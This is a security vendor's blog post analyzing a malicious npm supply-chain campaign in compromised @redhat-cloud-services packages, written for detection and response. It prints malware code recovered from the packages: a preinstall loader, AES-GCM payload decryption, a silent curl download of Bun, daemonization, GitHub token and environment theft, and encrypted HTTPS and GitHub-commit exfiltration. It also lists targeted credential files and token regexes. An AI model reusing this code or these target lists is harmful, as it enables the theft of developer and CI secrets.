---
title: "Mini Shai-Hulud Campaign Hits Red Hat Cloud Services npm Packages"
short_title: "Mini Shai-Hulud Hits Red Hat Cloud Services npm"
date: 2026-06-01 12:00:00 +0000
categories: [Malware, Supply Chain]
tags: [Shai-Hulud, TeamPCP, npm, JavaScript]
author: socket_research_team
canonical_url: https://socket.dev/blog/mini-shai-hulud-campaign-hits-red-hat-cloud-services-npm-packages
source: Socket
image:
  path: https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fthfvnext.bing.com%2Fth%2Fid%2FOIP.1GU0WwbCJTRIHKiCCLnqDgHaE3%3Fcb%3Dthfvnextfalcon%26pid%3DApi&f=1&ipt=fa63ac74d984e4c58c956a4cec9181f6fcc2451d620a8bd1fc8089ee0d26989f&ipo=images
  alt: "Mini Shai-Hulud Campaign Hits Red Hat Cloud Services npm Packages"
description: "A mini Shai-Hulud campaign compromised Red Hat Cloud Services npm packages to steal developer and CI/CD secrets during installation."
---

Socket has detected a malicious npm supply chain campaign involving compromised `@redhat-cloud-services` packages published under the Red Hat Cloud Services namespace. This is effectively a mini Shai-Hulud campaign: it uses the same core tactics of install-time execution, credential harvesting, CI/CD targeting, encrypted exfiltration, and potential downstream propagation. Since TeamPCP recently [released](https://socket.dev/blog/teampcp-supply-chain-attack-contest) Shai-Hulud as open source attack tooling while promoting a BreachForums contest for package compromises, attribution remains unclear, as the publicly available tooling lowers the barrier to entry and enables a broad range of threat actors to conduct similar operations.

The affected package versions execute an obfuscated payload through a `preinstall` hook, meaning the malware can run automatically during `npm install` before a developer imports or uses the package. Based on Socket’s analysis, the payload is designed to collect GitHub Actions secrets, npm tokens, cloud credentials, Kubernetes and Vault material, SSH keys, Git credentials, and other sensitive files. It also includes encrypted exfiltration logic and GitHub-based fallback mechanisms, indicating that the attacker was not only attempting to steal credentials, but also potentially enable further supply chain propagation.

Socket’s threat research team is continuing to analyze the malware and its potential impact. We are also tracking affected packages, versions, and detection details on our public campaign page: [Red Hat Cloud Services Package Compromise](https://socket.dev/supply-chain-attacks/red-hat-cloud-services-package-compromise).

![](https://cdn.sanity.io/images/cgdhsj6q/production/ec74027ff302106376dc9c93f1459a1a6e4b44cc-1242x1384.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner’s analysis of @redhat-cloud-services/chrome@2.3.1 highlights the package’s install/import-time JavaScript loader, which reconstructs hidden source through runtime decoding, decrypts embedded payload blobs with AES-128-GCM, and dynamically executes the resulting code from index.js. This behavior confirms that the malicious functionality is intentionally concealed from static review and staged for second-stage credential theft, environment inspection, and outbound communication._

## Technical Analysis

### Obfuscation Analysis

Affected packages use multiple obfuscation and staging layers:

### Install-time execution through npm lifecycle script

The `package.json` contains:

```javascript
"scripts": {
  "preinstall":"node index.js"
}
```

This causes the malicious loader to execute automatically before installation completes.

### Misleading package entry point

Affected packages advertise normal-looking Red Hat Cloud Services functionality, but their CommonJS entry point is the malicious loader:

```javascript
"main":"index.js",
"module":"esm/index.js"
```

The `esm/index.js` file appears more like expected library code, but `index.js` is a large obfuscated loader. This is deceptive because Node/CommonJS consumers and npm lifecycle execution hit the malicious file.

### Stage-one JavaScript obfuscation

`index.js` begins with a char-code array, Caesar/ROT-style transform, and `eval`:

```javascript
try {
eval(function(s,n){
returns.replace(/[a-zA-Z]/g,function(c){
varb=c<="Z"?65:97;
returnString.fromCharCode((c.charCodeAt(0)-b+n)%26+b)
    })
  }([40,120,112,...].map(function(c){
returnString.fromCharCode(c)
  }).join(""),3))
}catch(e) {
console.log("wrapper:",e.message||e)
}
```

This decodes into an async wrapper that imports Node crypto APIs and decrypts embedded payloads.

### AES-GCM encrypted embedded payloads

The decoded wrapper contains AES-128-GCM encrypted blobs:

```javascript
const_d=(k,i,a,c)=>{
constd=_c.createDecipheriv(
"aes-128-gcm",
Buffer.from(k,"hex"),
Buffer.from(i,"hex"),
    {authTagLength:16}
  );
d.setAuthTag(Buffer.from(a,"hex"));
returnBuffer.concat([
d.update(Buffer.from(c,"hex")),
d.final()
  ])
};
```

It decrypts two payloads:

- `_b`: a Bun installer/helper script.
- `_p`: the main malicious payload.

### Payload staging through `/tmp` and Bun

The wrapper writes the decrypted payload to a randomized temporary file, executes it with Bun, and then removes the file:

```javascript
constt="/tmp/p"+Math.random().toString(36).slice(2)+".js";
_fs.writeFileSync(t,_p);

if(typeofBun!=="undefined"){
try {
_cp.execSync('bun run "'+t+'"',{stdio:"inherit"})
  }finally {
try {_fs.unlinkSync(t) }catch {}
  }
}else {
await(0,eval)(_b);
try {
_cp.execSync('"'+getBunPath()+'" run "'+t+'"',{stdio:"inherit"})
  }finally {
try {_fs.unlinkSync(t) }catch {}
  }
}
```

This staging design is intentionally evasive: the payload is decrypted at runtime, written to a random `/tmp/p*.js` file, executed, and deleted.

### Custom payload string encryption

The main payload uses a large string table and a custom decryption function. It also defines a named decryption primitive: `f4abccab2`

Decoded values include:

```javascript
https://api.github.com
python-requests/2.31.0
api.anthropic.com
v1/api
index.js
IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner
thebeautifulmarchoftime
gh auth token
```

This confirms that meaningful strings are intentionally hidden until runtime.

## Inline Comments

The following snippets are taken from the analyzed packages and decrypted payload. Comments are added inline to explain the malicious functionality.

### 1. npm install-time execution

```javascript
{
  "name":"@redhat-cloud-services/chrome",
  "version":"2.3.1",
  "main":"index.js",
  "module":"esm/index.js",
  "scripts": {
    "preinstall":"node index.js"
    // Executes index.js automatically during npm install.
    // This means a user does not need to import or call the package for the payload to run.
  },
  "dependencies": {
    "lodash":"^4.17.21"
  }
}
```

### 2. Encrypted loader decrypts and executes payload

```javascript
const_d=(k,i,a,c)=>{
constd=_c.createDecipheriv(
"aes-128-gcm",
Buffer.from(k,"hex"),
Buffer.from(i,"hex"),
    {authTagLength:16}
  );
d.setAuthTag(Buffer.from(a,"hex"));

returnBuffer.concat([
d.update(Buffer.from(c,"hex")),
d.final()
  ])
};

// Decrypts embedded runtime payloads that are hidden from static/package review.
const_b=_d("2bec18af5f0f9cbe8949cc2bf5466dc6", ...).toString("utf8");
const_p=_d("d07ec47042a05fe3d684f72d2155d180", ...).toString("utf8");

constt="/tmp/p"+Math.random().toString(36).slice(2)+".js";
_fs.writeFileSync(t,_p);
// Writes the decrypted main payload to a randomized temporary JS file.

if(typeofBun!=="undefined"){
try {
_cp.execSync('bun run "'+t+'"',{stdio:"inherit"});
// Executes decrypted payload using Bun.
  }finally {
try {_fs.unlinkSync(t) }catch {}
// Deletes temporary payload after execution.
  }
}else {
await(0,eval)(_b);
// Evaluates helper that downloads Bun if not installed.

try {
_cp.execSync('"'+getBunPath()+'" run "'+t+'"',{stdio:"inherit"});
  }finally {
try {_fs.unlinkSync(t) }catch {}
  }
}
```

### 3. Silent Bun download helper

```javascript
globalThis.getBunPath=function(){
if(_bunCache)return_bunCache;

constosMap={linux:"linux",darwin:"darwin",win32:"windows"};
consta=arch==="arm64"?"aarch64":"x64";
constos=osMap[platform]??"linux";

constdir=mkdtempSync(join(tmpdir(),"b-"));
constexe=join(dir,os==="windows"?"bun.exe":"bun");

consturl="https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-"+os+"-"+a+".zip";
constzip=join(dir,"b.zip");

execSync('curl -sSL "'+url+'" -o "'+zip+'"',{stdio:"pipe"});
// Silently downloads an execution runtime during package install.

execSync('unzip -j -o "'+zip+'" -d "'+dir+'"',{stdio:"pipe"});
chmodSync(exe,"755");

_bunCache=exe;
returnexe;
}
```

### 4. Russian-locale avoidance

```javascript
functionZZ(){
try {
if (
      (Intl.DateTimeFormat().resolvedOptions().locale||"")
.toLowerCase()
.startsWith("ru")
    )returntrue;
// Avoids execution or changes behavior on Russian-language systems.
  }catch {}

if (
    (
process.env["LC_ALL"]||
process.env["LC_MESSAGES"]||
process.env["LANGUAGE"]||
process.env["LANG"]||
""
    ).toLowerCase().startsWith("ru")
  )returntrue;

returnfalse;
}
```

### 5. Daemonization on non-CI systems

```javascript
functionq9(){
if(process.env.__IS_DAEMON)returnfalse;

letchild=spawn(process.execPath,process.argv.slice(1), {
    detached:true,
    stdio:"ignore",
    cwd:process.cwd(),
    env:{...process.env,"__IS_DAEMON":"1"}
  });

child.unref();
returntrue;
// Detaches into a background process on developer workstations.
// This allows scanning/exfiltration to continue after the install process exits.
}
```

The payload also uses a lock file named: `tmp.0987654321.lock`

This is used to avoid duplicate running instances.

### 6. Environment and GitHub CLI token collection

```javascript
classO6extendsE {
async execute() {
letout= {};

try {
lettok=execSync("gh auth token", {
        encoding:"utf-8",
        stdio:["pipe","pipe","pipe"]
      }).trim();

if(tok){
out.token=tok;
out.tokenInfo=awaitr(tok);
      }
// Collects the local GitHub CLI authentication token.
    }catch {}

out.hostname=os.hostname();

try {
out.username=os.userInfo().username;
    }catch {
out.username=process.env["USER"]??process.env["LOGNAME"]??"unknown";
    }

out.environment=process.env;
// Captures the entire process environment, which commonly contains CI,
// cloud, registry, deployment, and application secrets.

returnthis.result(out);
  }
}
```

### 7. Sensitive file and token scanning

```javascript
classW6extendsE {
  constructor(){
super("filesystem","diskfiles",{
      ghtoken:/gh[op]_[A-Za-z0-9]{36}/g,
      npmtoken:/npm_[A-Za-z0-9]{36,}/g
    },"low");

this.hotspots=[
"~/.aws/config",
"~/.aws/credentials",
"~/.azure/accessTokens.json",
"~/.config/gcloud/application_default_credentials.json",
"~/.docker/config.json",
"~/.kube/config",
"~/.npmrc",
".npmrc",
"~/.pypirc",
"~/.netrc",
"~/.ssh/id*",
"~/.ssh/id_rsa",
"~/.ssh/id_ed25519",
"~/.git-credentials",
".git-credentials",
"~/.bitcoin/wallet.dat",
"~/.ethereum/keystore/*"
    ];
// Targets cloud credentials, package-registry tokens,
// SSH private keys, Git credentials, Kubernetes config, Docker auth,
// and cryptocurrency wallet files.
  }
}
```

### 8. GitHub Actions runner memory harvesting

```javascript
classY6extendsE {
  constructor(){
super("github","runner",{
      ghtoken:/gh[op]_[A-Za-z0-9]{36,}/g,
      npmtoken:/npm_[A-Za-z0-9]{36,}/g,
      ghs_jwt:/ghs_\d+_[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
      ghs_old:/ghs_[A-Za-z0-9]{36,}/g
    },"aggressive");

this.isGitHubActions=process.env["GITHUB_ACTIONS"]==="true";
this.isLinuxRunner=process.env["RUNNER_OS"]==="Linux";
  }

  runPrivilegedStdin(cmd,stdin) {
returnexecFileSync("sudo "+cmd, {
      input:stdin,
      maxBuffer:0x20000000
    });
// Attempts privileged execution on CI runners.
  }
}
```

This module is specifically designed to harvest GitHub Actions runner memory for tokens and secrets.

### 9. Encrypted HTTP exfiltration

```javascript
classq4 {
async createEnvelope(data) {
letjson=JSON.stringify(data);
letgz=awaitgzip(Buffer.from(json));

letaesKey=randomBytes(32);
letiv=randomBytes(12);

letwrappedKey=publicEncrypt({
      key:DZ,
      padding:RSA_PKCS1_OAEP_PADDING,
      oaepHash:"sha256"
    },aesKey);

letcipher=createCipheriv("aes-256-gcm",aesKey,iv);

return {
      envelope:Buffer.concat([
iv,
cipher.update(gz),
cipher.final(),
cipher.getAuthTag()
      ]).toString("base64"),
      key:wrappedKey.toString("base64")
    };
// Compresses and encrypts stolen data before exfiltration.
// This prevents defenders from inspecting payload contents in transit.
  }
}

classq5extendsq4 {
get url() {
return"https://"+
this.destination.domain+
":"+
this.destination.port+
"/"+
this.destination.path;
  }

async send(obj) {
letr=awaitfetch(this.url, {
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(obj)
    });
// Sends encrypted collection results over HTTPS POST.
  }
}
```

The decoded destination is: `https://api.anthropic.com:443/v1/api`

### 10. GitHub API fallback exfiltration

```javascript
asynccommitToRepo(envelope){
letdata=JSON.stringify(envelope,null,2);
letfilename="results-"+Date.now()+"-"+this.commitCounter+++".json";

letmessage=envelope.token
?"IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner:"+envelope.token
:"Add files.";

letbytes=Buffer.from(data,"utf-8");

if(bytes.length<=0x1e00000) {
awaitthis.commitFileWithRetry(
filename,
message,
bytes.toString("base64")
    );
// Exfiltrates encrypted results by committing JSON files
// through the GitHub API.
  }
}
```

The string below is a strong unique IoC: `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner`

## Functionality Analysis

### Primary actions performed

The package performs the following actions:

1. **Executes automatically during npm installation**
  - Uses `preinstall`
  - Runs `node index.js`
1. **Decrypts hidden payloads**
  - Uses AES-GCM to decrypt a Bun helper and the main payload
  - Uses `eval` and runtime decryption
1. **Installs/loads Bun if needed**
  - Downloads Bun from GitHub using `curl`
  - Extracts with `unzip`
  - Executes the decrypted payload with Bun
1. **Runs as a background process on non-CI systems**
  - Detaches using `child_process.spawn`
  - Uses `__IS_DAEMON`
  - Uses a lock file to prevent duplicate instances
1. **Performs anti-analysis and environment checks**
  - Checks for Russian locale/environment
  - Checks for CI/CD environment variables
  - Checks for security/EDR tooling
  - Detects canary or decoy tokens
1. **Collects secrets and host data**
  - Environment variables
  - GitHub CLI token via `gh auth token`
  - npm tokens
  - GitHub tokens
  - Cloud credentials
  - Docker, Kubernetes, Vault, SSH, Git, and package-manager credentials
  - Potential wallet files
  - GitHub Actions runner memory secrets
1. **Queries cloud and registry APIs**
  - AWS metadata and Secrets Manager
  - Azure identity, management, and Key Vault endpoints
  - GCP Secret Manager and Cloud Resource Manager
  - npm registry token/package endpoints
  - GitHub REST and GraphQL APIs
1. **Attempts GitHub repository/workflow modification**
  - Uses stolen GitHub tokens to enumerate and process repositories
  - References `.github/workflows/codeql.yml`, `.github/setup.js`, `.claude/settings.json`, and GitHub Actions workflow modification logic
  - Contains code capable of writing malicious `index.js`style payloads into repositories/actions
1. **Exfiltrates collected data**
  - Primary channel: encrypted HTTPS POST
  - Fallback channel: GitHub API commits of encrypted JSON result files

### Fallback exfiltration channel

The payload can also exfiltrate through GitHub by creating or updating files such as: `results-<timestamp>-<counter>.json`

It commits the encrypted result envelope through the GitHub API. The commit message can include: `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner:<token>`

### Data likely exfiltrated

The payload is designed to collect and transmit:

```
Environment variables
GitHub CLI tokens
GitHub personal access tokens
GitHub Actions tokens
npm tokens
AWS credentials
AWS metadata credentials
AWS Secrets Manager values
Azure credentials
Azure Key Vault secrets
GCP credentials
GCP Secret Manager values
Vault tokens/secrets
Kubernetes service account tokens
Docker credentials
SSH private keys
Git credentials
.npmrc files
.env files
.pypirc files
.netrc files
Cloud config files
Repository metadata
CI runner secrets
Potential cryptocurrency wallet files
Hostnames and usernames
```

## Recommendations and Mitigations

Organizations should treat any system that installed one of the affected `@redhat-cloud-services` package versions as potentially compromised. The payload executes during `npm install`, before application code imports or uses the package, so exposure depends on installation or CI execution, not runtime use.

### Identify Exposure

Search source repositories, lockfiles, package manager metadata, CI logs, build artifacts, developer machines, and internal package caches for the affected package names and versions. Pay particular attention to `package-lock.json`, `npm-shrinkwrap.json`, `yarn.lock`, `pnpm-lock.yaml`, SBOMs, artifact manifests, and historical CI logs.

Organizations should also review whether any affected package was installed in GitHub Actions, local developer workstations, container builds, release jobs, or package publishing workflows. CI/CD exposure is especially important because the malware targets GitHub Actions secrets, npm tokens, cloud credentials, Kubernetes material, Vault tokens, and other high-value automation secrets.

### Contain Affected Systems

If an affected package was installed on a developer workstation, isolate the host and preserve relevant logs before remediation. Because the malware includes background execution and potential developer-tool persistence mechanisms, uninstalling the npm package or deleting `node_modules` should not be considered sufficient cleanup.

For CI/CD systems, suspend affected workflow runs, invalidate build artifacts produced during the exposure window, and review whether any release, container image, npm package, or deployment artifact was created after the malicious package was installed.

### Remove Malicious Versions

Remove the affected package versions from projects and dependency locks. Replace them with known-clean versions only after verifying the package metadata, source repository state, and release provenance. Clear local and CI package caches where affected tarballs may persist.

Where feasible, rebuild from clean environments rather than reusing existing runners, workspaces, `node_modules` directories, or cached package layers.

### Rotate Exposed Credentials

Assume that credentials accessible to the process, shell environment, developer profile, or CI job may have been collected. Rotate GitHub tokens, npm tokens, cloud provider credentials, Kubernetes service account tokens, Vault tokens, Docker registry credentials, PyPI credentials, SSH keys, Git credentials, and any secrets stored in `.env`, `.npmrc`, `.pypirc`, `.netrc`, cloud config files, or CI/CD secret stores.

For GitHub Actions, prioritize the `GITHUB_TOKEN`, explicitly referenced workflow secrets, npm publishing tokens, cloud deployment credentials, and any credentials available through OIDC federation. Review whether compromised credentials could access additional repositories, packages, cloud projects, secret managers, or deployment environments.

### Review GitHub and npm Activity

Audit GitHub organization and repository activity for newly created repositories, suspicious branches, unexpected workflow files, unusual Contents API writes, new or modified `.github/workflows/*` files, and commits containing files such as `results-<timestamp>-<counter>.json`.

Review npm publisher activity for unexpected package versions, modified package metadata, publishing from automation tokens, provenance anomalies, or package releases that do not match the corresponding source repository.

### Hunt for Persistence and Local Artifacts

Inspect developer machines and workspaces for suspicious changes to `~/.claude/settings.json`, `.vscode/tasks.json`, `.github/workflows/codeql.yml`, `.github/setup.js`, and other developer or CI configuration files. Look for unexpected `SessionStart`, `folderOpen`, or install-time execution hooks.

Search for temporary payload artifacts and execution traces, including randomized `/tmp/p*.js` files, `/tmp/b-*` Bun extraction directories, `b.zip`, local Bun binaries, `tmp.0987654321.lock`, and process trees involving `node index.js`, `bun run`, `curl`, `unzip`, or `gh auth token` during package installation.

### Strengthen CI/CD and Dependency Controls

Restrict default GitHub Actions token permissions to least privilege, require explicit write permissions only where needed, and separate build, test, release, and publishing jobs. Avoid exposing npm publishing tokens or broad cloud credentials to routine dependency installation steps.

Use dependency allowlisting, package cooldown periods, SBOM generation, package verification, and lockfile enforcement to reduce exposure to newly published malicious versions. Where practical, run dependency installation with lifecycle scripts disabled by default, then allowlist required install scripts for known dependencies.

Add network egress controls for CI/CD runners and developer build environments. Alert on unexpected outbound traffic during dependency installation, especially to unusual API paths, unexpected GitHub Contents API writes, runtime downloads, cloud metadata endpoints, and package registry token endpoints.

Finally, do not treat provenance or trusted publishing as a complete control by itself. In this incident, the malicious releases appear to have been published through trusted upstream automation, which means defenders need runtime monitoring, package behavior analysis, and release-path hardening in addition to provenance checks.

## Indicators of Compromise

### Network Indicators

The following endpoint was decoded from the analyzed payload and is associated with the malware’s encrypted exfiltration logic. Socket does not assess that this domain is threat actor-owned infrastructure; rather, the suspicious activity is the payload’s use of this host and path for encrypted outbound data transfer during package installation or CI/CD execution.

- `api.anthropic[.]com`
- `https://api.anthropic[.]com:443/v1/api`

### Detection Opportunities

The following endpoints belong to legitimate services and should not be treated as threat actor-controlled infrastructure. They are included as detection opportunities because unexpected access to these endpoints from npm lifecycle scripts, dependency installation, temporary JavaScript payloads, or non-publishing CI jobs may indicate credential validation, package enumeration, runtime staging, provenance abuse, or supply-chain propagation.

- `https://api.github[.]com`
- `https://api.github[.]com/graphql`
- `https://github[.]com/oven-sh/bun/releases/download/bun-v1.3.13/`
- `https://registry.npmjs[.]org/-/npm/v1/tokens`
- `https://registry.npmjs[.]org/-/npm/v1/oidc/token/exchange/package/`
- `https://registry.npmjs[.]org/-/whoami`
- `https://registry.npmjs[.]org/-/v1/search?text=maintainer:<user>&size=250`
- `https://fulcio.sigstore[.]dev/api/v2/signingCert`
- `https://rekor.sigstore[.]dev/api/v1/log/entries`

The following cloud, identity, metadata, and secret-management endpoints are also legitimate services. They are included because access from package installation or build steps may indicate credential discovery or secret harvesting.

- `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- `http://169.254.169.254/latest/api/token`
- `http://169.254.170.2`
- `https://login.microsoftonline[.]com`
- `https://management.azure[.]com`
- `https://vault.azure[.]net`
- `https://secretmanager.googleapis[.]com`
- `https://cloudresourcemanager.googleapis[.]com`

### GitHub Repository Markers

The malware includes GitHub-based fallback exfiltration behavior. If a usable GitHub token is obtained, the payload can write encrypted collection results into GitHub repositories. Hunt for repositories, commits, and files matching the following markers:

- `Miasma: The Spreading Blight`
- `results-<timestamp>-<counter>.json`
- `results/results-<timestamp>-<counter>.json`
- `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner`
- `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner:<token>`

### Host and Execution Indicators

- `preinstall` lifecycle script executing `node index.js`
- `node index.js`
- `bun run /tmp/p*.js`
- `/tmp/p<random>.js`
- `/tmp/b-*/b.zip`
- `/tmp/b-*/bun`
- `/tmp/b-*/bun.exe`
- `tmp.0987654321.lock`
- `curl -sSL`
- `unzip -j -o`
- `gh auth token`
- `ps aux 2>/dev/null`
- `tasklist 2>/dev/null`
- `sudo python3`
- `__IS_DAEMON`
- `SKIP_DOMAIN`

### Code and String Indicators

- `f4abccab2`
- `thebeautifulmarchoftime`
- `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner`
- `Miasma: The Spreading Blight`
- `python-requests/2.31.0`
- `gh auth token`
- `"preinstall":"node index.js"`
- `"main":"index.js"`
- `createDecipheriv("aes-128-gcm"`
- `createCipheriv("aes-256-gcm"`
- `RSA_PKCS1_OAEP_PADDING`
- `oaepHash:"sha256"`

### Secret Targets

- `GITHUB_TOKEN`
- `ACTIONS_RUNTIME_TOKEN`
- `ACTIONS_ID_TOKEN_REQUEST_URL`
- `ACTIONS_ID_TOKEN_REQUEST_TOKEN`
- `NPM_TOKEN`
- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_SESSION_TOKEN`
- `AWS_SHARED_CREDENTIALS_FILE`
- `AWS_CONFIG_FILE`
- `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
- `AWS_CONTAINER_CREDENTIALS_FULL_URI`
- `AWS_WEB_IDENTITY_TOKEN_FILE`
- `AWS_ROLE_ARN`
- `AWS_ROLE_SESSION_NAME`
- `AWS_PROFILE`
- `AZURE_TENANT_ID`
- `ARM_TENANT_ID`
- `AZURE_CLIENT_ID`
- `ARM_CLIENT_ID`
- `AZURE_CLIENT_SECRET`
- `ARM_CLIENT_SECRET`
- `AZURE_FEDERATED_TOKEN_FILE`
- `ARM_OIDC_TOKEN_FILE_PATH`
- `GOOGLE_APPLICATION_CREDENTIALS`
- `GCP_PROJECT`
- `GCLOUD_PROJECT`
- `GOOGLE_CLOUD_PROJECT`
- `DEVSHELL_PROJECT_ID`
- `KUBECONFIG`
- `KUBERNETES_SERVICE_HOST`
- `KUBERNETES_SERVICE_PORT`
- `VAULT_ADDR`
- `VAULT_TOKEN`
- `VAULT_AUTH_TOKEN`
- `VAULT_API_TOKEN`

### File and Credential Collection Targets

- `~/.aws/config`
- `~/.aws/credentials`
- `~/.azure/accessTokens.json`
- `~/.azure/msal_token_cache.*`
- `~/.config/gcloud/application_default_credentials.json`
- `~/.config/gcloud/access_tokens.db`
- `~/.config/gcloud/credentials.db`
- `~/.docker/config.json`
- `/root/.docker/config.json`
- `/var/run/docker.sock`
- `~/.kube/config`
- `/var/run/secrets/kubernetes.io/serviceaccount/token`
- `/etc/rancher/k3s/k3s.yaml`
- `.env`
- `.env.local`
- `.env.production`
- `~/.npmrc`
- `.npmrc`
- `~/.yarnrc`
- `~/.pypirc`
- `~/.netrc`
- `~/.ssh/id*`
- `~/.ssh/id_rsa`
- `~/.ssh/id_ed25519`
- `~/.ssh/config`
- `~/.ssh/known_hosts`
- `/etc/ssh/ssh_host_*_key`
- `~/.git-credentials`
- `.git-credentials`
- `~/.config/git/credentials`
- `~/.gitconfig`
- `~/.bitcoin/wallet.dat`
- `~/.ethereum/keystore/*`
- `~/.electrum/wallets/*`

### Token Patterns

- `gh[op]_[A-Za-z0-9]{36,}`
- `npm_[A-Za-z0-9]{36,}`
- `ghs_\\d+_[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+`
- `ghs_[A-Za-z0-9]{36,}`

### SHA-256 Hashes

- @redhat-cloud-services_chrome-2.3.1.tar.gz: `88896d478986d453f5da79b311de39d9b4b1bea95c21af1d8ef181b0f4e52fe9`
- package/index.js: `21b6409a7b84446310daca5409ad6112ac60a1e4bef97736e53fff5f63bfdef4`
- package/package.json: `ee262510cb246d2b904991aee7fc61162bdae34463439ec6383bd5356479d362`
- Decrypted Bun helper: `ac2a2208e1726e008be6c73dc0872d9bba163319259dff1b62055ac933ca46b6`
- Decrypted main payload: `0dc06ecdaa63fe24859cfd955053c23245c536e4733480239d14bebf12688e35`
